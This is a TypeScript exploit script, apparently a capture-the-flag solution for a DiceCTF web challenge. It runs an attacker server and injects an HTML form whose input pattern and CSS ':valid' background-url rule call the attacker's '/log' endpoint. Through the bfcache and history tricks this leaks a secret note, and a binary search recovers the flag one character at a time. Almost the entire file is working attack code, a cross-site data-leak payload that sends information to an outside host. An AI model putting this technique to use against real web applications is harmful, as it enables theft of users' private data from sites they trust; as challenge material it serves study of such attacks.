import { Hono } from "hono"
import { join } from "node:path"

const app = new Hono()
const CHALL_URI = "http://localhost:8080"
const ATTACKER_URI = "http://localhost:3000"

let pattern: string
let if_state = false

app.get("/", (c) =>
  // history state: 
  // about:blank -> input with flag (*TARGET) -> /?note=<flag> -> our server 
  // ··· fill 5 shits + trigger:open(nav2payload) ··· history.go(-8)
  // bfcache max length: 8
  c.html(`
<script>
setTimeout(() => {
  const p = new URLSearchParams(location.search)
  let n = parseInt(p.get("n") ?? "1")
  if(n < 6)
    location.href = "/?n=" + (n + 1)
  else {
    location.href = "/at"
  }
}, 200)
</script>`)
)

app.get('/at', (c) => {
  // 相比 adragos 的 exp，我只使用了一个 style，就足以 leak 出 01 状态
  // 我使用了默认 value 防止设置 payload 时，空值命中 valid
  return c.html(`
    <script>
      (async function(){
        const sleep = x => new Promise(r => setTimeout(r, x))
        const payload = \`
<form method=get>
<input name=note class=z value=shit type=text pattern=${pattern} />
</form>
<style>
.z:valid{background:url(${ATTACKER_URI}/log);}
</style>\`.replace(/\\n/g, '')
        const w = open('${CHALL_URI}/?'+new URLSearchParams({
          note: payload
        }))
        await sleep(1200)
        w.close()
        history.go(-8)
      })()
    </script>
  `)
})

app.get('/log', c => {
  if_state = true
  return c.text('ok')
})


async function binary_brute() {
  let flag = ''
  async function visit(url: string) {
    await Bun.$`node adminbot.js "$(cat flag.txt)" "${url}"`.cwd(join(__dirname, '..'))
  }
  async function _if(l: number, r: number) {
    let set = ''
    const pass = '#@\'"&\\-+.*+?^${}()|[]<>`';
    for (let i = l; i <= r; i++) {
      if (!pass.includes(String.fromCharCode(i)))
        set += String.fromCharCode(i)
    }
    pattern = `^dice.${flag}[${set}].*`
    if_state = false
    await visit(ATTACKER_URI)
    console.log('[DEBUG]', pattern, if_state)
    return if_state
  }
  while (true) {
    let l = 48
    let r = 126
    while (l < r) {
      const m = Math.floor(l + (r - l) / 2)
      if (await _if(l, m)) {
        // [l, m]
        r = m
      } else {
        // [m + 1, r]
        l = m + 1
      }
    }
    if (l === r)
      flag += String.fromCharCode(l)
    else
      break
    console.log(`[Brute] find ${flag}`)
  }
  console.log(`[SUCCESS] flag is dice\{${flag}\}`)
}

Bun.serve({
  fetch: app.fetch,
  port: 3000
})

await binary_brute()

// 大概需要十五分钟爆破 36 位 flag
